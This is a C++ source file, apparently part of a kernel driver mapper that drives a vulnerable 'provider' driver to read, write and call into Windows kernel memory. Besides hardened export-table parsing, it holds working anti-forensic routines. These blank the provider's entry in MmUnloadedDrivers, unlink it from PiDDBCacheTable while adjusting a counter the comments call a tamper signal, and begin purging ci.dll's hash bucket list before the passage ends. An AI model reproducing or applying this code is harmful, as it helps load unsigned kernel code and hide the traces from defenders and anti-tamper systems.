 * The name, ordinal and function tables of an export directory all hold RVAs
 * into the module image, and a module with a malformed export directory can
 * hold a name RVA that points anywhere. The old code turned such an RVA into a
 * pointer and handed it to std::string, which reads until it happens to find a
 * zero byte: that is either an unbounded read from a wild address, which is an
 * access violation inside the mapper, or a read past the end of the directory
 * copy, which is a heap over-read. Neither is acceptable here, because a
 * failure in the mapper is a crash the operator cannot diagnose.
 *
 * So the RVA has to fit in the module, and the read is capped: a name with no
 * terminator within the cap is truncated rather than followed, and every read
 * goes straight to the module through the provider instead of through a local
 * copy whose extent is unrelated to where the name actually lives.
 */
static bool ReadModuleString(uint64_t module_base, uint64_t module_size, uint32_t rva, std::string& out) {
	constexpr size_t kMaxModuleStringLength = 512;

	if (rva >= module_size)
		return false;

	const size_t available = static_cast<size_t>(module_size - rva);
	const size_t to_read = available < kMaxModuleStringLength ? available : kMaxModuleStringLength;

	auto buffer = std::make_unique<char[]>(to_read + 1);
	if (!Driver::ReadMemory(module_base + rva, buffer.get(), to_read))
		return false;

	buffer[to_read] = '\0';
	out.assign(buffer.get(), strnlen_s(buffer.get(), to_read));
	return true;
}

/*
 * Headers of a kernel module, validated once and shared.
 *
 * Both export resolvers need the same three things: that the image really is a
 * PE, how big it is, and where its export directory lives. Reading them in one
 * place keeps the validation and its consumption from drifting apart, which is
 * what let the two resolvers disagree about what had been checked.
 */
struct KernelModuleHeaders {
	uint64_t image_size = 0;
	uint32_t export_rva = 0;
	uint32_t export_size = 0;

	//A zero image size means "not a usable image", and every other field is
	//left at 0 in that case.
	explicit operator bool() const { return image_size != 0; }
};

static KernelModuleHeaders ReadKernelModuleHeaders(uint64_t kernel_module_base) {
	KernelModuleHeaders headers;
	if (!kernel_module_base)
		return headers;

	IMAGE_DOS_HEADER dos_header = { 0 };
	if (!Driver::ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) ||
		dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return headers;

	//Dereferenced to reach the NT headers, so bounded before it is used.
	if (dos_header.e_lfanew < 0 || dos_header.e_lfanew > kMaxNtHeaderOffset)
		return headers;

	IMAGE_NT_HEADERS64 nt_headers = { 0 };
	if (!Driver::ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) ||
		nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return headers;

	const uint64_t image_size = nt_headers.OptionalHeader.SizeOfImage;
	if (image_size <= sizeof(IMAGE_NT_HEADERS64) ||
		static_cast<uint64_t>(dos_header.e_lfanew) > image_size - sizeof(IMAGE_NT_HEADERS64))
		return headers;

	headers.image_size = image_size;
	headers.export_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	headers.export_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	return headers;
}

/*
 * Look up an export by name in a loaded kernel module.
 *
 * The export directory is copied out of kernel memory into a user mode buffer
 * first, so the table bases it holds can be read once instead of per entry, and
 * every RVA those tables hold is then checked before it is dereferenced.
 *
 * Guards, in order:
 *   - the DOS and NT signatures, and a bounded e_lfanew, so this is only ever
 *     run on a real image
 *   - the three table bases have to fit inside the module, together with the
 *     number of entries each of them claims, because an out of range table base
 *     would have the provider read unmapped kernel memory and a read of
 *     unmapped memory faults inside the provider rather than failing here
 *   - an ordinal below NumberOfFunctions, before indexing the function table
 *   - a function RVA that is non zero and inside the module
 *   - a forwarded export (an RVA pointing back into the export directory),
 *     which has no code behind it and is rejected instead of returned
 *
 * Returns 0 when the module, the export, or any check fails.
 */
uint64_t Driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	const auto headers = ReadKernelModuleHeaders(kernel_module_base);
	if (!headers)
		return 0;

	const uint64_t module_size = headers.image_size;
	const auto export_base = headers.export_rva;
	const auto export_base_size = headers.export_size;

	if (!export_base || !export_base_size)
		return 0;

	if (export_base >= module_size || export_base_size > module_size - export_base)
		return 0;

	/*
	 * The export directory header is copied out once so the three table bases
	 * it holds are available without a provider round trip per entry, but the
	 * entries themselves are read straight from the module: a name that sits
	 * outside the copied range is legal, and reaching it through the copy would
	 * be an out of bounds read on the mapper's own heap.
	 */
	IMAGE_EXPORT_DIRECTORY export_directory = { 0 };
	if (!ReadMemory(kernel_module_base + export_base, &export_directory, sizeof(export_directory)))
		return 0;

	const uint32_t number_of_names = export_directory.NumberOfNames;
	const uint32_t number_of_functions = export_directory.NumberOfFunctions;

	if (number_of_names == 0 || number_of_names > kMaxExportEntries ||
		number_of_functions == 0 || number_of_functions > kMaxExportEntries)
		return 0;

	const uint32_t name_table_rva = export_directory.AddressOfNames;
	const uint32_t ordinal_table_rva = export_directory.AddressOfNameOrdinals;
	const uint32_t function_table_rva = export_directory.AddressOfFunctions;

	//Each table has to hold the number of entries it claims, inside the module.
	//This is the check that keeps the provider from being handed an address
	//outside the image, which would fault inside the driver instead of failing
	//here.
	if (name_table_rva >= module_size ||
		static_cast<uint64_t>(number_of_names) * sizeof(uint32_t) > module_size - name_table_rva)
		return 0;
	if (ordinal_table_rva >= module_size ||
		static_cast<uint64_t>(number_of_names) * sizeof(uint16_t) > module_size - ordinal_table_rva)
		return 0;
	if (function_table_rva >= module_size ||
		static_cast<uint64_t>(number_of_functions) * sizeof(uint32_t) > module_size - function_table_rva)
		return 0;

	const uint64_t export_end = static_cast<uint64_t>(export_base) + export_base_size;

	for (uint32_t i = 0; i < number_of_names; ++i) {
		uint32_t name_rva = 0;
		if (!ReadMemory(kernel_module_base + name_table_rva + static_cast<uint64_t>(i) * sizeof(uint32_t),
			&name_rva, sizeof(name_rva)))
			continue;

		std::string current_function_name;
		if (!ReadModuleString(kernel_module_base, module_size, name_rva, current_function_name))
			continue;

		if (_stricmp(current_function_name.c_str(), function_name.c_str()) != 0)
			continue;

		//The ordinal comes from the module and indexes the function table, so it
		//has to be inside it before it is dereferenced.
		uint16_t function_ordinal = 0;
		if (!ReadMemory(kernel_module_base + ordinal_table_rva + static_cast<uint64_t>(i) * sizeof(uint16_t),
			&function_ordinal, sizeof(function_ordinal)))
			return 0;

		if (function_ordinal >= number_of_functions)
			return 0;

		uint32_t function_rva = 0;
		if (!ReadMemory(kernel_module_base + function_table_rva + static_cast<uint64_t>(function_ordinal) * sizeof(uint32_t),
			&function_rva, sizeof(function_rva)))
			return 0;

		//A function RVA of zero is an unpopulated slot, and one outside the
		//module is not a code address at all.
		if (function_rva == 0 || function_rva >= module_size)
			return 0;

		//A forwarded export points back into the export directory instead of
		//holding code. 64bit kernels do not use them.
		if (function_rva >= export_base && function_rva < export_end)
			return 0;

		return kernel_module_base + function_rva;
	}

	return 0;
}


/*
 * Blank the provider's name in the kernel's MmUnloadedDrivers list.
 *
 * The chain is found without guessing any address: the mapper's own device
 * handle is looked up in the system handle table, which yields the FILE_OBJECT,
 * and the DEVICE_OBJECT, DRIVER_OBJECT and loader entry are then read through
 * the resolved offsets.
 *
 * Everything read is validated before the single write: the offsets come from
 * the PDB, the name has to be a kernel pointer with a plausible length, and the
 * name that is actually there has to be ours. Only the UNICODE_STRING Length is
 * then set to 0, which is what the kernel checks to decide whether to record an
 * unloaded driver - the buffer and the name itself are left untouched.
 *
 * Returns false, having written nothing, if any check fails.
 */
bool Driver::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(Nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(Nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<Nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const Nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == hDevice)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	//The handle gives us the driver object of the provider without guessing a
	//single address.
	uint64_t device_object = 0;

	if (!ReadMemory(object + g_offsets.FileObject_DeviceObject, &device_object, sizeof(device_object)) || !device_object) {
		Log(L"[-] Failed to find device_object (offset " << Val(Hex(g_offsets.FileObject_DeviceObject)) << L")" << std::endl);
		return false;
	}
	if (!IsKernelAddress(device_object)) {
		Log(L"[-] device_object is not a kernel address, the offsets do not match this build" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_object + g_offsets.DeviceObject_DriverObject, &driver_object, sizeof(driver_object)) || !driver_object) {
		Log(L"[-] Failed to find driver_object (offset " << Val(Hex(g_offsets.DeviceObject_DriverObject)) << L")" << std::endl);
		return false;
	}
	if (!IsKernelAddress(driver_object)) {
		Log(L"[-] driver_object is not a kernel address, the offsets do not match this build" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(driver_object + g_offsets.DriverObject_DriverSection, &driver_section, sizeof(driver_section)) || !driver_section) {
		Log(L"[-] Failed to find driver_section (offset " << Val(Hex(g_offsets.DriverObject_DriverSection)) << L")" << std::endl);
		return false;
	}
	//driver_section is the KLDR_DATA_TABLE_ENTRY the name is read out of, so a
	//value that is not a kernel pointer would be dereferenced straight into the
	//provider. Refuse instead.
	if (!IsKernelAddress(driver_section)) {
		Log(L"[-] driver_section is not a kernel address, the offsets do not match this build" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		Log(L"[-] Failed to find driver name (offset " << Val(Hex(g_offsets.LdrEntry_BaseDllName)) << L")" << std::endl);
		return false;
	}

	//Validate the UNICODE_STRING before it is touched: the buffer pointer must
	//be a kernel address, the length must be sane and match MaximumLength.
	if (((uint64_t)us_driver_base_dll_name.Buffer) < 0xFFFF000000000000ULL ||
		us_driver_base_dll_name.Length > 1024 ||
		us_driver_base_dll_name.Length % sizeof(wchar_t) != 0 ||
		us_driver_base_dll_name.MaximumLength < us_driver_base_dll_name.Length) {
		Log(L"[-] Driver name structure does not look valid, refusing to write" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		Log(L"[-] Failed to read driver name" << std::endl);
		return false;
	}

	//Confirm we are blanking the entry of *our* driver, not a random one.
	//
	//The walk below starts at this process's own device handle, so the chain
	//does resolve to the provider in practice. That is an argument, not a proof:
	//an offset that is wrong for this build and happens to land on a different
	//loader entry would previously have been blanked silently, and the kernel
	//would then record nothing at all for a driver that really did unload.
	//
	//BaseDllName holds the file name the provider was loaded from, which is the
	//generated name with no extension. The comparison is case insensitive
	//because the loader preserves whatever case the file name was created with
	//and GetDriverNameW draws from both cases.
	std::wstring found_name(unloadedName.get());
	if (found_name.empty() || found_name.size() > 64) {
		Log(L"[-] Driver name is implausible, refusing to write" << std::endl);
		return false;
	}

	const std::wstring expected_name = GetDriverNameW();
	bool name_is_ours = found_name.size() == expected_name.size();
	if (name_is_ours) {
		for (size_t i = 0; i < found_name.size(); ++i) {
			if (towlower(found_name[i]) != towlower(expected_name[i])) {
				name_is_ours = false;
				break;
			}
		}
	}

	if (!name_is_ours) {
		Log(L"[-] Loader entry holds \"" << Val(found_name) << L"\" but this provider was loaded as \""
			<< Val(expected_name) << L"\", the offsets do not point at it; refusing to write" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; //MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver

	if (!WriteMemory(driver_section + g_offsets.LdrEntry_BaseDllName, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		Log(L"[-] Failed to write driver name length" << std::endl);
		return false;
	}

	Log(L"[+] MmUnloadedDrivers = Cleaned | EntryName = " << Val(found_name) << std::endl);
	return true;
}

/*
 * Resolve an export by ordinal.
 *
 * Only the function-address table is needed, so this reads the export directory
 * header alone rather than copying the whole directory: the names and ordinal
 * tables are not involved, and a module that exports nothing by name still
 * resolves.
 */
uint64_t Driver::GetKernelModuleExportOrdinal(uint64_t kernel_module_base, uint16_t ordinal) {
	if (!kernel_module_base || !ordinal)
		return 0;

	const auto headers = ReadKernelModuleHeaders(kernel_module_base);
	if (!headers)
		return 0;

	const uint64_t module_size = headers.image_size;
	const auto export_base = headers.export_rva;

	if (!export_base || export_base >= module_size ||
		sizeof(IMAGE_EXPORT_DIRECTORY) > module_size - export_base)
		return 0;

	//IMAGE_EXPORT_DIRECTORY is 40 bytes and is fixed layout across Windows
	//versions, so only the header is read instead of the whole directory.
	BYTE export_header[sizeof(IMAGE_EXPORT_DIRECTORY)] = { 0 };
	if (!ReadMemory(kernel_module_base + export_base, export_header, sizeof(export_header)))
		return 0;

	const auto* export_data = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(export_header);

	const uint32_t number_of_functions = export_data->NumberOfFunctions;
	if (number_of_functions == 0 || number_of_functions > kMaxExportEntries)
		return 0;

	/*
	 * The function table has to hold the number of entries the directory claims
	 * exists, and all of them have to be inside the module. This is the check
	 * that keeps the provider from being handed an address outside the image,
	 * where its read would fault inside the driver rather than fail here: an
	 * out of range AddressOfFunctions combined with a large index is exactly
	 * the combination that used to be accepted.
	 */
	const uint32_t function_table_rva = export_data->AddressOfFunctions;
	if (function_table_rva >= module_size ||
		static_cast<uint64_t>(number_of_functions) * sizeof(uint32_t) > module_size - function_table_rva)
		return 0;

	//An ordinal below the table base is out of range by definition: the base is
	//the ordinal of the first entry in the function-address table.
	if (ordinal < export_data->Base)
		return 0;

	const uint32_t index = static_cast<uint32_t>(ordinal - export_data->Base);
	if (index >= number_of_functions)
		return 0;

	uint32_t function_rva = 0;
	if (!ReadMemory(kernel_module_base + function_table_rva + (static_cast<uint64_t>(index) * sizeof(uint32_t)), &function_rva, sizeof(function_rva)))
		return 0;

	//A function RVA of zero is an unpopulated slot, and one outside the module
	//is not a code address at all.
	if (function_rva == 0 || function_rva >= module_size)
		return 0;

	return kernel_module_base + function_rva;
}

//Take the exclusive lock on a kernel ERESOURCE (ERESOURCE type).
//Returns false when the resource is null, the export is missing, or the
//kernel call itself fails.
bool Driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = 0;
	if (!kernel_ExAcquireResourceExclusiveLite) {
		kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
		if (!kernel_ExAcquireResourceExclusiveLite) {
			Log(L"[-] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
			return false;
		}
	}

	BOOLEAN out = FALSE;

	return (CallKernelFunction(&out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

//Release a lock taken by ExAcquireResourceExclusiveLite.
bool Driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_ExReleaseResourceLite = 0;
	if (!kernel_ExReleaseResourceLite) {
		kernel_ExReleaseResourceLite = GetKernelModuleExport(Driver::ntoskrnlAddr, "ExReleaseResourceLite");
		if (!kernel_ExReleaseResourceLite) {
			Log(L"[-] Failed to find ExReleaseResourceLite" << std::endl);
			return false;
		}
	}

	return CallKernelFunction<void>(nullptr, kernel_ExReleaseResourceLite, Resource);
}

//Delete one element from an RTL_AVL_TABLE in the kernel.
BOOLEAN Driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = 0;
	if (!kernel_RtlDeleteElementGenericTableAvl) {
		kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
		if (!kernel_RtlDeleteElementGenericTableAvl) {
			Log(L"[-] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
			return false;
		}
	}

	bool out = false;
	return (CallKernelFunction(&out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

//Find an element in an RTL_AVL_TABLE in the kernel, using the table's own
//compare routine. Returns the entry, or 0 when it is not present.
PVOID Driver::RtlLookupElementGenericTableAvl(Nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_RtlLookupElementGenericTableAvl = 0;
	if (!kernel_RtlLookupElementGenericTableAvl) {
		kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(Driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
		if (!kernel_RtlLookupElementGenericTableAvl) {
			Log(L"[-] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
			return nullptr;
		}
	}

	PVOID out = nullptr;

	if (!CallKernelFunction(&out, kernel_RtlLookupElementGenericTableAvl, Table, Buffer))
		return 0;

	return out;
}

/*
 * Build the key used to find our own entry in PiDDBCacheTable.
 *
 * The table's compare routine reads DriverName and TimeDateStamp from the key
 * at the offsets it uses for the real entries, so this has to be a full
 * PiDDBCacheEntry rather than a partial one: a zeroed struct with only the name
 * set would compare against garbage and simply never match.
 */
Nt::PiDDBCacheEntry* Driver::LookupEntry(Nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {

	Nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return (Nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

/*
 * Remove the provider's entry from the kernel's PiDDBCacheTable.
 *
 * Both the table and the lock are located through PDB offsets. The entry is
 * found by name and timestamp, the PiDDB lock is held for the whole
 * modification, and the layout of the entry is confirmed by matching our own
 * driver name inside it before anything is written - _PiDDBCacheEntry is not a
 * public UDT, so the offsets cannot be taken from symbols alone.
 *
 * Removal is two steps because the kernel holds two structures per entry: it is
 * unlinked from the intrusive list, then deleted from the AVL table. DeleteCount
 * is decremented afterwards because RtlDeleteElementGenericTableAvl does not
 * always maintain it, and the kernel treats it as a tamper signal.
 *
 * Every failure path releases the lock before returning, and nothing is written
 * until the entry has been verified as ours.
 */
bool Driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDriver

	auto PiDDBLockOffset = SymbolsHandler::GetInstance()->GetOffset(L"PiDDBLock");
	if (!PiDDBLockOffset)
	{
		Log(L"[-] Warning PiDDBLock not found" << std::endl);
		return false;
	}

	auto PiDDBCacheTableOffset = SymbolsHandler::GetInstance()->GetOffset(L"PiDDBCacheTable");
	if (!PiDDBCacheTableOffset)
	{
		Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
		return false;
	}

	PVOID PiDDBLock = (PVOID)(Driver::ntoskrnlAddr + PiDDBLockOffset);
	Nt::PRTL_AVL_TABLE PiDDBCacheTable = (Nt::PRTL_AVL_TABLE)(Driver::ntoskrnlAddr + PiDDBCacheTableOffset);

	if (!ExAcquireResourceExclusiveLite(PiDDBLock, true)) {
		Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
		return false;
	}
	LogBlank();
	Log(L"[+] PiDDBLock = Locked" << std::endl);

	auto n = GetDriverNameW();

	/*
	 * The timestamp the entry is keyed on comes from the provider image this
	 * very binary carries. GetNtHeaders returns null for anything that is not a
	 * PE, and dereferencing that is a null read in the mapper's own address
	 * space rather than the clean failure every other path here produces - so it
	 * is checked even though the resource is a fixed, valid driver.
	 */
	const auto provider_headers = PE::GetNtHeaders((void*)Resource::driver, sizeof(Resource::driver));
	if (!provider_headers) {
		Log(L"[-] The embedded provider resource is not a valid PE image" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	auto timestamp = provider_headers->FileHeader.TimeDateStamp;

	// search our entry in the table
	Nt::PiDDBCacheEntry* pFoundEntry = (Nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
	if (pFoundEntry == nullptr) {
		Log(L"[-] Not found in cache" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	//The AVL lookup runs in the kernel and hands back a raw pointer. A value
	//that is not a kernel address means the table or its compare routine is not
	//the one assumed, and every read below would be a bad address handed to the
	//provider.
	if (!IsKernelAddress((uint64_t)pFoundEntry)) {
		Log(L"[-] PiDDBCacheTable lookup returned a non-kernel pointer, aborting cleanup" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	//The layout of this type is not available from the public PDBs, so the
	//DriverName field is located by content instead of by a hardcoded offset,
	//and only that verified offset is used below.
	//
	//The scan window is the real size of _PiDDBCacheEntry, not a round 0x80.
	//The struct is 0x38 bytes, so a 0x80 window read up to 0x48 bytes past it -
	//off the end of the pool block and, for an entry that ends near a page
	//boundary, into an unmapped page, where the provider's memcpy faults
	//instead of returning false. Bounding to the struct means the scan only
	//examines offsets a UNICODE_STRING can actually occupy, and the real
	//DriverName (offset 0x10) is still inside that range.
	{
		const std::wstring needle = n;
		const uint32_t name_field = FindUnicodeStringFieldByContent((uint64_t)pFoundEntry, sizeof(Nt::PiDDBCacheEntry), needle);
		//The sentinel, not 0: _PiDDBCacheEntry.DriverName really does sit at 0x10
		//today, so treating 0 as "not found" worked by luck and would have made
		//a build that moves the field to the start of the struct abort here while
		//the layout was in fact the one the rest of this function expects.
		if (name_field == kFieldNotFound) {
			Log(L"[-] Could not locate the driver name inside the PiDDB entry, aborting cleanup" << std::endl);
			ExReleaseResourceLite(PiDDBLock);
			return false;
		}

		Log(L"[+] PiDDBEntryNameFieldOffset = " << Val(Hex(name_field)) << L" | VerifiedByContent = OK" << std::endl);
	}
	LogBlank();

	// first, unlink from the list
	PLIST_ENTRY prev;
	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListBlink, &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	PLIST_ENTRY next;
	if (!ReadMemory((uintptr_t)pFoundEntry + g_offsets.PiDDBCacheEntry_ListFlink, &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't get next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	//Both links are written to below. A link that is not a kernel address means
	//the entry layout does not match this build, and the write would go to a bad
	//address through the provider.
	if (!IsKernelAddress((uint64_t)prev) || !IsKernelAddress((uint64_t)next)) {
		Log(L"[-] PiDDBCacheTable entry links are not kernel addresses, aborting cleanup" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	//...and the kernel half of the address space is mostly unmapped, and the
	//provider does not validate what it is given. The WdFilter unlink already
	//probes both neighbours before writing through them; this one did not, so a
	//list pointer that survived the range test above was written through blind.
	//The two fields written are the Flink of prev and the Blink of next.
	const uint64_t prev_flink_addr = reinterpret_cast<uint64_t>(prev) + offsetof(struct _LIST_ENTRY, Flink);
	const uint64_t next_blink_addr = reinterpret_cast<uint64_t>(next) + offsetof(struct _LIST_ENTRY, Blink);
	if (!ProbeKernelRangeMapped(prev_flink_addr, sizeof(_LIST_ENTRY*)) ||
		!ProbeKernelRangeMapped(next_blink_addr, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] PiDDBCacheTable entry neighbour link fields are not mapped, aborting cleanup" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	Log(L"[+] TableEntry = " << Val(reinterpret_cast<void*>(pFoundEntry)) << std::endl);

	if (!WriteMemory(prev_flink_addr, &next, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set next entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (!WriteMemory(next_blink_addr, &prev, sizeof(_LIST_ENTRY*))) {
		Log(L"[-] Can't set prev entry" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	// then delete the element from the avl table
	if (!RtlDeleteElementGenericTableAvl(PiDDBCacheTable, pFoundEntry)) {
		Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}

	//Decrement DeleteCount with checked I/O, matching the WdFilter cleanup. A
	//failed read must not be treated as "nothing to do" - that leaves the
	//kernel's tamper signal (the count) inconsistent with the table - and a
	//failed write means the two have diverged. Both release the lock and
	//report the failure rather than silently continuing.
	ULONG cacheDeleteCount = 0;
	if (!ReadMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
		Log(L"[-] Could not re-read PiDDBCacheTable DeleteCount, state may be inconsistent" << std::endl);
		ExReleaseResourceLite(PiDDBLock);
		return false;
	}
	if (cacheDeleteCount > 0) {
		cacheDeleteCount--;
		if (!WriteMemory((uintptr_t)PiDDBCacheTable + g_offsets.AvlTable_DeleteCount, &cacheDeleteCount, sizeof(ULONG))) {
			Log(L"[-] Failed to decrement PiDDBCacheTable DeleteCount" << std::endl);
			ExReleaseResourceLite(PiDDBLock);
			return false;
		}
	}

	// release the ddb resource lock
	ExReleaseResourceLite(PiDDBLock);
	Log(L"[+] PiDDBCacheTable = Cleaned" << std::endl);
	Log(L"[+] PiDDBLock = Released" << std::endl);

	return true;
}

/*
 * Remove the provider's entry from ci.dll's kernel hash bucket list.
 *
 * The list is a singly linked list of HashBucketEntry, each holding the path of
 * a driver image the kernel has hashed. The list head and the lock come from
 * PDB offsets; the entry layout is not public, so the name field is confirmed by
 * matching our own name in the entry before that offset is trusted.
 *
 * Matching is done on the expected name length first (the full path minus the
 * two characters of "\??") and then on the content, so the fast path only does
 * one small read for entries that cannot match.
 *
 * The entry is unlinked and its pool block freed, and the lock is released on
 * every path. An entry that does not verify is skipped rather than unlinked.
 */
bool Driver::ClearKernelHashBucketList() {
	uint64_t ci = Utilities::GetKernelModuleAddress("ci.dll");
	if (!ci) {
		Log(L"[-] Can't Find ci.dll module address" << std::endl);
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto g_KernelHashBucketListOffset = SymbolsHandler::GetInstance()->GetOffset(L"g_KernelHashBucketList");
	if (!g_KernelHashBucketListOffset)
	{
		Log(L"[-] Can't Find g_KernelHashBucketList Offset" << std::endl);
		return false;
	}

	auto g_HashCacheLockOffset = SymbolsHandler::GetInstance()->GetOffset(L"g_HashCacheLock");
	if (!g_HashCacheLockOffset)
	{
		Log(L"[-] Can't Find g_HashCacheLock Offset" << std::endl);
		return false;
	}

	PVOID g_KernelHashBucketList = (PVOID)(ci + g_KernelHashBucketListOffset);
	PVOID g_HashCacheLock = (PVOID)(ci + g_HashCacheLockOffset);
	LogBlank();
	Log(L"[+] g_KernelHashBucketList = " << Val(reinterpret_cast<void*>(g_KernelHashBucketList)) << std::endl);

	if (!ExAcquireResourceExclusiveLite(g_HashCacheLock, true)) {
		Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
		return false;
	}
	Log(L"[+] g_HashCacheLock = Locked" << std::endl);

	Nt::HashBucketEntry* prev = (Nt::HashBucketEntry*)g_KernelHashBucketList;
	Nt::HashBucketEntry* entry = 0;
	if (!ReadMemory((uintptr_t)prev, &entry, sizeof(PVOID))) {
		Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return false;
	}
	if (!entry) {
		Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
		if (!ExReleaseResourceLite(g_HashCacheLock)) {
			Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW();

	/*
	 * Bound on the walk.
	 *
	 * Every other unbounded walk in this file is capped (kMaxWdFilterRuntimeDrivers,
	 * kMaxExportEntries, kMaxNtHeaderOffset) and this one was not, while holding
	 * g_HashCacheLock - an auto-boosted ERESOURCE. The 0x13C
	 * INVALID_IO_BOOST_STATE bugcheck recorded a few lines below came from a loop
	 * in here that could not terminate, and only the one branch that failed to
	 * advance was fixed. A circular list still spins forever, so the bound is now
	 * on the loop itself rather than on any particular branch of it.
	 *
	 * ci.dll holds one entry per driver image the kernel has hashed for the
	 * lifetime of the boot, so a few hundred is a real system; 4096 is far above
	 * that and below anything that would be mistaken for a hang.
	 */
	constexpr uint32_t kMaxHashBucketEntries = 4096;

	//The HashBucketEntry layout is not in the public PDB, so the DriverName offset
	//stays at its compiled default (0x8) and is confirmed by content on each
	//entry: the name is read from that offset and matched against this run's name.
